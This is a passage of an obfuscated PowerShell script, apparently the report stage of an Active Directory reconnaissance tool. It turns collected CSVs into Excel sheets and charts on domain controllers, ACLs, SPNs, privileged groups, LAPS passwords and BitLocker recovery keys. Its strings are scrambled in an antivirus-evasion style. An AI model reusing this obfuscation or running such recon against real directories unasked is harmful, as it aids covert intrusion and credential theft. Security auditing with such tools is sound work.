            "G5", ("{3}{0}{2}{4}{1}" -f'IF(B5<1','E)','4,TRUE','=',', FALS')

            
            "G6", (("{1}{4}{7}{2}{0}{3}{6}{5}" -f 'RU','=I','B6<>T','E,TRU','F','ALSE)','E, F','('))

            
            "G7", (("{5}{2}{3}{1}{0}{4}" -f'S','AL','E',',TRUE, F','E)','=IF(B7<>FALS'))

            
            "G8", ("{5}{4}{6}{2}{1}{8}{0}{7}{3}" -f',TRUE, ','8<','ND(B8>=1,B','LSE)','F','=I','(A','FA','15)')

            
            "G9", (("{3}{4}{2}{6}{0}{5}{1}{8}{7}"-f '10),TRUE, FA','S','R(B9=0,B','=IF(','O','L','9>',')','E'))

            
            "G10", ("{4}{0}{3}{1}{2}"-f'IF(B10<15','U','E, FALSE)',',TR','=') )

            For ($i = 0; $i -lt $($ObjValues."Co`Unt"); $i++)
            {
                $worksheet."rA`NgE"($ObjValues[$i])."fO`RM`A`TCoNDIt`iOnS"."A`Dd"( (  gEt-vaRiaBLE nL3gD  -VaLuEONL )::"XLEXPrE`SsI`on", 0, $ObjValues[$i+1]) | Out-Null
                $i++
            }

            "C2", "C3" , "C5", "C6", "C8", "C9", "E2", "E3" , "E4", "E5", "E6", "E9", "G2", "G3", "G4", "G5", "G6", "G7", "G8", "G9", "G10" | ForEach-Object {
                $worksheet.("{1}{0}" -f'nge','Ra').Invoke($_)."Fo`RMAt`condiT`IoNs".("{1}{0}" -f 'tem','I').Invoke(1)."S`To`PiftrUe" = $false
                $worksheet.("{1}{0}" -f'ange','R').Invoke($_)."fOrMaTcO`NdiTIO`NS".("{1}{0}"-f'em','It').Invoke(1)."F`ONt"."CoL`oRin`DeX" = 3
            }

            $workbook."w`orkShe`ETs".("{0}{1}"-f'I','tem').Invoke(1)."HY`pe`RLINKs".("{1}{0}" -f'dd','A').Invoke($workbook."WORKSH`e`ETs".("{0}{1}" -f 'I','tem').Invoke(1)."C`ells".("{0}{1}"-f'Ite','m').Invoke(1,4) , ("{19}{14}{16}{13}{21}{2}{18}{12}{0}{4}{5}{10}{11}{6}{8}{1}{9}{17}{20}{15}{7}{3}" -f 'tand','ory','u','s','ar','ds.org/document','te','ds','g','=','_libra','ry?ca','s','e','tps://www.pci','ci_','s','pci','rity','ht','dss&document=p','c'), "" , "", ("{2}{3}{0}{1}"-f '.','1','PCI DSS v','3.2')) | Out-Null
            $workbook."Wo`RKSH`EetS".("{0}{1}"-f 'Ite','m').Invoke(1)."h`y`pERLinKs".("{0}{1}"-f 'A','dd').Invoke($workbook."W`ORKShe`Ets".("{1}{0}" -f 'em','It').Invoke(1)."cE`lls".("{1}{0}" -f 'm','Ite').Invoke(1,6) , ("{6}{5}{0}{7}{2}{3}{4}{1}"-f':','/ism/','acs','c.gov.','au/infosec','s','http','//'), "" , "", ("{3}{4}{1}{2}{0}" -f'ls','Cont','ro','2018 ','ISM ')) | Out-Null
            $workbook."wO`Rks`HEETS".("{0}{1}" -f 'I','tem').Invoke(1)."HyPe`R`liNKS".("{1}{0}"-f'dd','A').Invoke($workbook."WORKSH`ee`TS".("{0}{1}" -f 'It','em').Invoke(1)."ce`lLS".("{0}{1}" -f'Ite','m').Invoke(1,7) , ("{4}{9}{14}{12}{16}{5}{8}{13}{2}{11}{3}{6}{7}{15}{0}{1}{10}"-f'e','rver','ark/micr','ft_wind','h','urity.org/','o','ws_','benc','ttps://ww','/','oso','cis','hm','w.','s','ec'), "" , "", ("{1}{0}{2}{3}{4}" -f 'IS Benchm','C','ark',' 201','6')) | Out-Null

            $excel."SCRe`e`NU`PDatiNg" = $true
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable ("{1}{2}{0}" -f't','works','hee')
        }

        $ADFileName = -join($ReportPath,'\',("{0}{3}{1}{2}{4}"-f 'Doma','ers.','cs','inControll','v'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{3}{4}{0}{1}{2}"-f'tro','l','lers','Dom','ain Con')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{0}{2}"-f 'Na','ADFile','me')
        }

        $ADFileName = -join($ReportPath,'\',("{3}{0}{4}{1}{2}" -f 'oupChang','s','v','Gr','es.c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}{3}{2}" -f'r','G','s','oup Change')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{2}{0}" -f'me','ADFileN','a')

            Get-ADRExcelSort -ColumnName ("{2}{1}{0}" -f 'p Name','rou','G')
        }

        $ADFileName = -join($ReportPath,'\',("{1}{2}{0}" -f's.csv','D','ACL'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f'DACL','s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{0}{1}"-f'DFileNam','e','A')
        }

        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}" -f 'SAC','csv','Ls.'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f'SAC','Ls')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{2}{0}" -f'Name','ADF','ile')
        }

        $ADFileName = -join($ReportPath,'\',("{1}{0}" -f's.csv','GPO'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}" -f'POs','G')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{1}{0}"-f 'ileName','DF','A')
        }

        $ADFileName = -join($ReportPath,'\',("{3}{2}{0}{1}"-f 's.cs','v','k','gPLin'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}"-f 'gP','Links')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{2}{0}"-f 'leName','A','DFi')
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}"-f 'DNS','Nodes'),("{0}{1}"-f '.cs','v'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{3}{2}{1}"-f 'DNS','ecords','R',' ')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{0}{2}{1}"-f'A','ileName','DF')
        }

        $ADFileName = -join($ReportPath,'\',("{1}{2}{3}{0}"-f'sv','DNSZo','nes.','c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{0}{1}" -f 'e','s','DNS Zon')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{0}{1}"-f 'l','eName','ADFi')
        }

        $ADFileName = -join($ReportPath,'\',("{2}{3}{1}{0}"-f'v','s','Printer','s.c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{1}{0}" -f'rs','rinte','P')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{0}{2}" -f'leNa','ADFi','me')
        }

        $ADFileName = -join($ReportPath,'\',("{3}{2}{0}{1}{4}" -f'ecoveryKe','ys.c','rR','BitLocke','sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{1}{0}"-f 'cker','tLo','Bi')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{0}{3}{1}" -f'l','Name','ADFi','e')
        }

        $ADFileName = -join($ReportPath,'\',("{1}{2}{0}" -f 'sv','L','APS.c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}"-f'APS','L')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{1}{0}"-f'me','eNa','ADFil')
        }

        $ADFileName = -join($ReportPath,'\',("{3}{2}{0}{1}" -f'Ns','.csv','P','ComputerS'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{3}{2}{1}{0}"-f' SPNs','er','omput','C')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{0}{1}"-f'e','Name','ADFil')

            Get-ADRExcelSort -ColumnName ("{0}{1}"-f'User','Name')
        }

        $ADFileName = -join($ReportPath,'\',("{3}{0}{4}{2}{1}"-f'ut','v','cs','Comp','ers.'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{2}{1}"-f 'Comput','rs','e')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{0}{1}{2}" -f 'ADFi','le','Name')

            Get-ADRExcelSort -ColumnName ("{0}{1}"-f'UserNa','me')

            $worksheet = $workbook."wO`RK`SheEts".("{1}{0}" -f'em','It').Invoke(1)
            
            $worksheet.("{1}{0}"-f 't','Selec').Invoke()
            $worksheet."aPPlI`ca`Tion"."ActiVeW`i`NdOW"."SPL`I`TCOLUmN" = 1
            $worksheet."a`pPLiCa`TioN"."Ac`T`IV`ewINDOW"."s`PLiT`ROW" = 1
            $worksheet."aPPliCA`T`IoN"."AcTi`VE`WINd`OW"."f`REEZ`ePAneS" = $true

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable ("{2}{1}{0}" -f'eet','orksh','w')
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}"-f 'O','Us.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "OUs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{0}{2}" -f 'DFil','A','eName')
        }

        $ADFileName = -join($ReportPath,'\',("{1}{2}{3}{0}"-f's.csv','G','rou','p'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f 'Grou','ps')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{1}{0}"-f 'ame','leN','ADFi')

            Get-ADRExcelSort -ColumnName ("{3}{1}{0}{2}"-f'uishedN','ting','ame','Dis')
        }

        $ADFileName = -join($ReportPath,'\',("{2}{0}{3}{1}" -f'ou','.csv','Gr','pMembers'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{0}{1}" -f'Me','mbers','Group ')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{0}{1}{2}"-f 'AD','FileN','ame')

            Get-ADRExcelSort -ColumnName ("{1}{0}{2}"-f'u','Gro','p Name')
        }

        $ADFileName = -join($ReportPath,'\',("{2}{3}{0}{1}" -f'SPNs.cs','v','U','ser'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{1}{0}" -f'Ns','SP','User ')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{1}{0}"-f'eName','l','ADFi')
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}" -f 'Use','rs.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}"-f's','User')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{2}{0}"-f 'me','ADFil','eNa')

            Get-ADRExcelSort -ColumnName ("{1}{0}{2}"-f 'erNam','Us','e')

            $worksheet = $workbook."w`orKshe`Ets".("{0}{1}"-f'I','tem').Invoke(1)

            
            $worksheet.("{1}{0}" -f'elect','S').Invoke()
            $worksheet."APP`LIcat`ION"."A`C`TIvE`WIndow"."SP`L`i`TcolUmn" = 1
            $worksheet."App`LI`caTIon"."aC`T`I`Vewindow"."S`PL`ITrow" = 1
            $worksheet."APpLi`Ca`TI`oN"."a`ctIVEwIN`DoW"."f`REe`z`ePANES" = $true

            $worksheet."CEL`LS".("{1}{0}" -f'em','It').Invoke(1,3)."INtERi`OR"."Colo`RIn`dex" = 5
            $worksheet."cel`Ls".("{1}{0}"-f 'em','It').Invoke(1,3)."FO`NT"."C`O`loRiNDeX" = 2
            
            $worksheet."uS`EdRA`Nge".("{1}{0}"-f't','Selec').Invoke() | Out-Null
            $excel."SEle`C`TiON".("{1}{2}{0}"-f 'ilter','Aut','oF').Invoke(3,$true) | Out-Null
            $worksheet."cEL`LS".("{0}{1}"-f'I','tem').Invoke(1,1).("{0}{1}"-f'Selec','t').Invoke() | Out-Null
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable ("{0}{2}{1}" -f'wo','t','rkshee')
        }

        
        $ADFileName = -join($ReportPath,'\',("{3}{1}{2}{0}"-f'v','rSP','Ns.cs','Compute'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}{2}{5}{4}{3}"-f'r Rol','Compute','e ','ts','ta','S')
            Remove-Variable ("{2}{3}{1}{0}"-f'e','m','A','DFileNa')

            $worksheet = $workbook."woRKsh`EE`TS".("{1}{0}" -f'tem','I').Invoke(1)
            $PivotTableName = ("{0}{1}{3}{2}" -f'Com','p','SPNs','uter ')
            Get-ADRExcelPivotTable -SrcSheetName ("{0}{1}{2}{3}{4}"-f'C','ompu','te','r',' SPNs') -PivotTableName $PivotTableName -PivotRows @(("{0}{1}" -f 'Se','rvice')) -PivotValues @(("{1}{0}{2}"-f'v','Ser','ice'))

            $worksheet."Ce`lls".("{1}{0}" -f'em','It').Invoke(1,1) = ("{2}{1}{0}"-f'e','r Rol','Compute')
            $worksheet."C`eLLS".("{1}{0}"-f'tem','I').Invoke(1,2) = ("{0}{1}" -f'Co','unt')

            
            $worksheet.("{2}{1}{3}{0}"-f 's','iv','P','otTable').Invoke($PivotTableName).("{1}{0}{3}{2}" -f 'otFie','Piv','s','ld').Invoke(("{1}{0}" -f 'e','Servic'))."Auto`s`OrT"(  (VArIABLe ('z'+'6R') -vaL  )::"Xld`eScE`NDINg",("{0}{1}" -f'C','ount'))

            Get-ADRExcelChart -ChartType ("{2}{1}{0}{3}" -f 'olumnC','lC','x','lustered') -ChartLayout 10 -ChartTitle ("{0}{4}{2}{6}{3}{1}{5}" -f'C','in','Rol','s ','omputer ',' AD','e') -RangetoCover ("{1}{0}" -f '2:U16','D')
            $workbook."WORK`Sh`eEts".("{1}{0}"-f 'tem','I').Invoke(1)."H`Yp`erlINKs".("{1}{0}"-f'd','Ad').Invoke($workbook."wOrks`HE`EtS".("{1}{0}" -f'em','It').Invoke(1)."Ce`LLs".("{1}{0}" -f 'em','It').Invoke(1,4) , "" , ((("{0}{4}{2}{3}{1}" -f 'Yd','SPNsYdt!A1','er',' ','tComput'))  -CREpLacE ([chaR]89+[chaR]100+[chaR]116),[chaR]39), "", ("{1}{0}"-f' Data','Raw')) | Out-Null
            $excel."WINd`O`Ws".("{1}{0}"-f 'tem','I').Invoke(1)."dIsP`LAYG`RiDl`INES" = $false
            Remove-Variable ("{2}{1}{0}" -f'tTableName','ivo','P')

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable ("{2}{0}{1}" -f 'rkshe','et','wo')
        }

        
        $ADFileName = -join($ReportPath,'\',("{1}{3}{2}{0}{4}" -f's','Compu','er','t','.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{3}{0}{2}{1}" -f 'r','m Stats','ating Syste','Ope')
            Remove-Variable ("{0}{2}{1}" -f 'ADFileN','e','am')

            $worksheet = $workbook."wo`Rks`HeeTs".("{0}{1}" -f'I','tem').Invoke(1)
            $PivotTableName = ("{0}{1}{2}{4}{3}" -f 'Operati','ng',' Sy','s','stem')
            Get-ADRExcelPivotTable -SrcSheetName ("{1}{2}{0}" -f'uters','Co','mp') -PivotTableName $PivotTableName -PivotRows @(("{3}{2}{1}{0}" -f 'stem','g Sy','eratin','Op')) -PivotValues @(("{0}{2}{3}{1}" -f'Oper','m','ati','ng Syste'))

            $worksheet."cE`llS".("{1}{0}"-f'm','Ite').Invoke(1,1) = ("{2}{3}{0}{1}"-f 'ing ','System','Opera','t')
            $worksheet."CE`LlS".("{0}{1}" -f'I','tem').Invoke(1,2) = ("{0}{1}" -f'Co','unt')

            
            $worksheet.("{0}{3}{1}{2}" -f 'P','otTab','les','iv').Invoke($PivotTableName).("{3}{2}{1}{0}" -f'lds','e','tFi','Pivo').Invoke(("{4}{2}{3}{1}{0}" -f'em','ing Syst','er','at','Op'))."autOs`o`Rt"( $z6r::"XldE`S`CenDi`NG",("{1}{0}"-f 'unt','Co'))

            Get-ADRExcelChart -ChartType ("{0}{4}{2}{3}{1}{5}" -f'xlC','luste','lu','mnC','o','red') -ChartLayout 10 -ChartTitle ("{2}{0}{4}{1}{3}" -f 'g Sy','t','Operatin','ems in AD','s') -RangetoCover ("{0}{1}"-f'D2:S','16')
            $workbook."Wor`KSHEE`TS".("{0}{1}" -f'Ite','m').Invoke(1)."H`ypERL`InKS".("{0}{1}" -f'A','dd').Invoke($workbook."WORkS`HEE`Ts".("{1}{0}"-f 'em','It').Invoke(1)."ce`LLs".("{1}{0}" -f'tem','I').Invoke(1,4) , "" , ("{0}{1}{2}{3}"-f'Com','put','er','s!A1'), "", ("{0}{1}"-f 'Raw ','Data')) | Out-Null
            $excel."w`inDO`WS".("{0}{1}" -f'Ite','m').Invoke(1)."D`ISpL`AY`GRIDLIn`eS" = $false
            Remove-Variable ("{1}{4}{2}{0}{3}"-f'otTa','P','v','bleName','i')

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable ("{3}{0}{1}{2}"-f'she','e','t','work')
        }

        
        $ADFileName = -join($ReportPath,'\',("{3}{2}{0}{1}"-f 'be','rs.csv','em','GroupM'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{3}{5}{1}{4}{0}" -f'ats','ed G','P','rivile','roup St','g')
            Remove-Variable ("{2}{0}{1}{3}" -f 'F','ile','AD','Name')

            $worksheet = $workbook."Wor`kSHe`eTs".("{0}{1}"-f 'Ite','m').Invoke(1)
            $PivotTableName = ("{2}{0}{3}{1}{4}" -f'up ','e','Gro','Memb','rs')
            Get-ADRExcelPivotTable -SrcSheetName ("{2}{1}{0}" -f ' Members','p','Grou') -PivotTableName $PivotTableName -PivotRows @(("{1}{0}{2}" -f'up','Gro',' Name'))-PivotFilters @(("{0}{1}{3}{2}"-f'A','cc','untType','o')) -PivotValues @(("{1}{0}{3}{2}" -f 'ntTy','Accou','e','p'))

            
            $worksheet.("{0}{3}{1}{2}" -f 'Pivo','ab','les','tT').Invoke($PivotTableName).("{3}{0}{2}{1}"-f'vo','lds','tFie','Pi').Invoke(("{1}{3}{2}{0}"-f 'tType','A','n','ccou'))."Cu`RRe`NtPage" = ("{1}{0}"-f'ser','u')

            $worksheet."cEL`ls".("{0}{1}"-f'Ite','m').Invoke(1,2)."I`NteriOR"."c`o`LorindEx" = 5
            $worksheet."Ce`LLs".("{0}{1}"-f 'It','em').Invoke(1,2)."F`oNt"."c`oLOri`NDex" = 2

            $worksheet."CEl`ls".("{1}{0}"-f 'm','Ite').Invoke(3,1) = ("{2}{3}{0}{1}"-f' N','ame','Grou','p')
            $worksheet."Cel`lS".("{0}{1}" -f'Ite','m').Invoke(3,2) = (("{5}{6}{4}{3}{2}{0}{1}" -f'cur','sive)','Re','ot-','(N','Coun','t '))

            $excel."ScREe`Nup`d`AtINg" = $false
            
            $PivotTableTemp = ($workbook.("{0}{2}{1}{3}"-f 'Pi','tCache','vo','s').Invoke().("{0}{1}"-f'I','tem').Invoke($workbook.("{1}{0}{3}{2}"-f 'i','P','ches','votCa').Invoke()."COu`NT")).("{2}{4}{0}{1}{3}" -f 'P','ivo','Crea','tTable','te').Invoke(("{1}{0}"-f 'C5','R1'),("{3}{2}{0}{1}"-f'ab','leTemp','otT','Piv'))
            $PivotFieldTemp = $PivotTableTemp.("{0}{3}{1}{2}" -f 'Piv','eld','s','otFi').Invoke(("{2}{0}{1}" -f 'am','e','Group N'))
            
            $PivotFieldTemp."O`R`iEn`TATIoN" =  $aBiEjU::"xL`pAGefi`e`LD"
            Try
            {
                $PivotFieldTemp."c`UrrEnt`Pa`Ge" = ("{0}{2}{3}{1}"-f 'Do','ins','main',' Adm')
            }
            Catch
            {
                
                $NoDA = $true
            }
            If ($NoDA)
            {
                Try
                {
                    $PivotFieldTemp."C`URre`N`TpAGe" = ("{0}{2}{3}{1}" -f 'A','ators','dmin','istr')
                }
                Catch
                {
                    
                }
            }
            
            $PivotSlicer = $workbook."Sl`icERcaCH`ES".("{0}{1}" -f'A','dd').Invoke($PivotTableTemp,$PivotFieldTemp)
            
            $PivotSlicer."Pi`VOTTab`Les".("{0}{2}{1}"-f'AddP','ble','ivotTa').Invoke($worksheet.("{1}{0}{3}{2}" -f'v','Pi','es','otTabl').Invoke($PivotTableName))
            
            $PivotSlicer.("{2}{0}{1}" -f 'let','e','De').Invoke()
            
            $PivotTableTemp."TAbLE`Ra`NGE2".("{0}{2}{1}"-f'D','te','ele').Invoke() | Out-Null

            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotFieldTemp
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotSlicer
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTableTemp

            Remove-Variable ("{2}{0}{1}{3}"-f 'tFi','eldTe','Pivo','mp')
            Remove-Variable ("{0}{2}{1}"-f 'Piv','r','otSlice')
            Remove-Variable ("{1}{0}{3}{2}" -f'le','PivotTab','mp','Te')

            ("{2}{0}{3}{1}"-f'nt Oper','tors','Accou','a'),("{3}{0}{1}{2}" -f'minist','rator','s','Ad'),("{3}{2}{0}{1}" -f ' Oper','ators','p','Backu'),("{2}{4}{3}{0}{1}"-f 'blisher','s','Cert','Pu',' '),("{1}{3}{0}{2}" -f' Operator','Cryp','s','to'),("{0}{1}{2}" -f 'DnsA','d','mins'),("{2}{3}{1}{0}{4}" -f' Admi','n','D','omai','ns'),("{0}{2}{5}{3}{1}{4}" -f'Ente','A','r','ise ','dmins','pr'),("{3}{1}{2}{0}"-f 'ins','rise Key ','Adm','Enterp'),("{0}{1}{4}{3}{5}{2}" -f'Inco','ming ','ders','orest T','F','rust Buil'),("{1}{0}{2}" -f'mi','Key Ad','ns'),("{2}{10}{0}{4}{9}{12}{1}{11}{6}{5}{14}{8}{7}{13}{3}"-f'oft A','at An','Micr','istrators','dvanced','t','ly','Adm','cs ',' ','os','a','Thre','in','i'),("{0}{1}{3}{2}" -f'Netw','ork O','ors','perat'),("{3}{0}{2}{1}"-f'erat','s','or','Print Op'),("{1}{2}{0}{4}{3}" -f 'c','P','rote','Users','ted '),("{0}{5}{1}{2}{4}{3}" -f 'R','mote De','sktop','Users',' ','e'),("{1}{0}{2}" -f'chema A','S','dmins'),("{0}{2}{3}{1}{4}"-f 'Se','r Operat','r','ve','ors') | ForEach-Object {
                Try
                {
                    $worksheet.("{3}{2}{1}{0}"-f'ables','T','t','Pivo').Invoke($PivotTableName).("{2}{1}{0}"-f'ields','ivotF','P').Invoke(("{1}{2}{0}"-f 'e','Group',' Nam')).("{1}{2}{0}"-f'votItems','P','i').Invoke($_)."vI`sIbLe" = $true
                }
                Catch
                {
                    
                }
            }

            
            $worksheet.("{0}{1}{2}"-f 'P','ivotT','ables').Invoke($PivotTableName).("{1}{0}{2}"-f'vo','Pi','tFields').Invoke(("{1}{2}{0}" -f'me','Grou','p Na'))."Au`TosO`RT"( ( GCi ('v'+'a'+'RiaBlE:'+'z6r') ).VALUe::"XLdE`sCeND`InG",(("{2}{5}{3}{1}{0}{4}"-f'ive','rs','Co','Recu',')','unt (Not-')))

            $worksheet."C`ELLs".("{1}{0}" -f 'm','Ite').Invoke(3,1)."iNt`E`RIOR"."C`OL`oRi`NDex" = 5
            $worksheet."cE`LLs".("{1}{0}" -f'tem','I').Invoke(3,1)."F`Ont"."CoLO`RI`NDEX" = 2

            $excel."SCr`e`EnUpdaT`InG" = $true

            Get-ADRExcelChart -ChartType ("{0}{2}{1}{3}{5}{4}"-f 'xl','olu','C','mnClu','tered','s') -ChartLayout 10 -ChartTitle ("{5}{2}{1}{6}{4}{7}{0}{3}" -f ' ','eged','l','in AD','Grou','Privi',' ','ps') -RangetoCover ("{1}{0}"-f'6','D2:P1') -StartRow "A3" -StartColumn "B3"
            $workbook."W`o`RkSHE`ETs".("{0}{1}"-f 'Ite','m').Invoke(1)."hYpEr`li`NkS".("{0}{1}"-f'Ad','d').Invoke($workbook."W`O`RkSh`eetS".("{0}{1}"-f'It','em').Invoke(1)."cE`LLS".("{1}{0}"-f'm','Ite').Invoke(1,4) , "" , ((("{2}{0}{3}{1}" -f 'up M','Csz!A1','CszGro','embers'))."REp`lacE"(([chAR]67+[chAR]115+[chAR]122),[stRING][chAR]39)), "", ("{2}{0}{1}" -f 'D','ata','Raw ')) | Out-Null
            $excel."Win`d`OWs".("{1}{0}" -f'm','Ite').Invoke(1)."dI`SPlAygRidLi`NEs" = $false

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable ("{1}{2}{0}" -f'sheet','wo','rk')
        }

        
        $ADFileName = -join($ReportPath,'\',("{2}{3}{1}{0}"-f'sv','puters.c','Co','m'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}{2}" -f'C','omput','er Stats')
            Remove-Variable ("{1}{0}{2}" -f 'DFileNa','A','me')

            $ObjAttributes = New-Object ("{9}{11}{3}{7}{4}{0}{6}{12}{1}{2}{10}{5}{13}{8}"-f 'tion','ized.','Ordere','ol','ec','Dict','s.Spec','l','nary','System.','d','C','ial','io')
            $ObjAttributes.("{1}{0}" -f 'd','Ad').Invoke(("{0}{3}{2}{1}{4}"-f 'De','gation ','e','l','Typ'),((("{0}{3}{1}{2}" -f'{0}Unconst','ned{','0}','rai'))  -F [chaR]34))
            $ObjAttributes.("{0}{1}" -f'A','dd').Invoke(("{0}{2}{3}{1}"-f 'Del','ype','egat','ion T'),((("{0}{2}{1}{3}{4}"-f 'Q2kConstrai','ed','n','Q','2k'))-CrEPlAcE 'Q2k',[CHAr]34))
            $ObjAttributes.("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}" -f 'SID','Histo','ry'),'"*"')
            $ObjAttributes.("{0}{1}"-f'A','dd').Invoke(("{2}{0}{1}" -f 'orman','t','D'),((("{2}{0}{1}"-f 'E1','04','104TRU'))."Re`Pl`ACE"(([ChAR]49+[ChAR]48+[ChAR]52),[STRiNg][ChAR]34)))
            $ObjAttributes.("{0}{1}"-f'A','dd').Invoke(((("{2}{1}{3}{0}{4}" -f'd Age ','s','Pas','wor','(> '))),((("{1}{0}{2}"-f 'RUE3','3n4T','n4'))."R`EP`LACE"('3n4',[stRiNg][Char]34)))
            $ObjAttributes.("{1}{0}" -f 'dd','A').Invoke(("{1}{3}{2}{4}{0}"-f 'd','ms-ds-','r','C','eatorSi'),'"*"')

            Get-ADRExcelAttributeStats -SrcSheetName ("{2}{0}{1}"-f 'r','s','Compute') -Title1 ("{2}{0}{3}{4}{1}" -f 'put','AD','Com','er Acc','ounts in ') -PivotTableName ("{1}{3}{2}{4}{0}"-f' Status','Compu','o','ter Acc','unts') -PivotRows ("{1}{0}{2}" -f'ble','Ena','d') -PivotValues ("{0}{1}{2}" -f'U','s','erName') -PivotPercentage ("{1}{2}{0}"-f'ame','User','N') -Title2 ("{7}{8}{2}{4}{1}{3}{5}{6}{0}" -f 'ounts',' C','s o','o','f','m','puter Acc','S','tatu') -ObjAttributes $ObjAttributes
            Remove-Variable ("{2}{3}{1}{0}"-f 'utes','ib','ObjAtt','r')

            Get-ADRExcelChart -ChartType ("{1}{0}"-f'Pie','xl') -ChartLayout 3 -ChartTitle ("{2}{4}{5}{1}{3}{0}{6}"-f' i',' ','C','Accounts','om','puter','n AD') -RangetoCover ("{0}{1}"-f 'A11:','D23') -ChartData $workbook."WOR`ksH`EETs".("{0}{1}"-f'It','em').Invoke(1).("{1}{0}" -f'ange','R').Invoke(("{0}{3}{2}{1}"-f'A3','4','B3:B',':A4,'))
            $workbook."w`orksHE`eTs".("{0}{1}"-f 'Ite','m').Invoke(1)."HYpEr`Li`Nks".("{0}{1}"-f 'A','dd').Invoke($workbook."wO`RKsh`Ee`TS".("{0}{1}" -f 'It','em').Invoke(1)."c`EllS".("{1}{0}"-f 'm','Ite').Invoke(10,1) , "" , ("{3}{0}{2}{1}"-f 'omput','s!A1','er','C'), "", ("{1}{0}" -f 'w Data','Ra')) | Out-Null

            Get-ADRExcelChart -ChartType ("{2}{1}{3}{0}" -f'ered','lBarC','x','lust') -ChartLayout 1 -ChartTitle ("{6}{4}{3}{1}{2}{0}{7}{5}" -f 'te','f Comp','u','us o','t','s','Sta','r Account') -RangetoCover ("{1}{2}{0}"-f '3','F11',':L2') -ChartData $workbook."wOR`Kshee`Ts".("{0}{1}" -f'I','tem').Invoke(1).("{1}{0}"-f'nge','Ra').Invoke(("{3}{1}{2}{0}" -f '8',':F8,G','2:G','F2'))
            $workbook."wO`RkSHE`E`Ts".("{1}{0}" -f 'em','It').Invoke(1)."hY`PE`RliNKs".("{0}{1}"-f'A','dd').Invoke($workbook."woR`ksh`eetS".("{0}{1}"-f 'It','em').Invoke(1)."c`eLLs".("{1}{0}" -f 'em','It').Invoke(10,6) , "" , ("{0}{3}{2}{1}"-f'Com','!A1','s','puter'), "", ("{1}{2}{0}"-f ' Data','Ra','w')) | Out-Null

            $workbook."W`OrkS`h`Eets".("{0}{1}" -f 'It','em').Invoke(1)."U`s`eDrAn`ge"."ENT`IR`ECOlUmN".("{0}{2}{1}"-f'A','Fit','uto').Invoke() | Out-Null
            $excel."WIND`OWS".("{0}{1}"-f 'It','em').Invoke(1)."D`IspLayGRidl`In`ES" = $false
        }

        
        $ADFileName = -join($ReportPath,'\',("{1}{0}{2}" -f 'r','Use','s.csv'))
        If (Test-Path $ADFileName)
        {
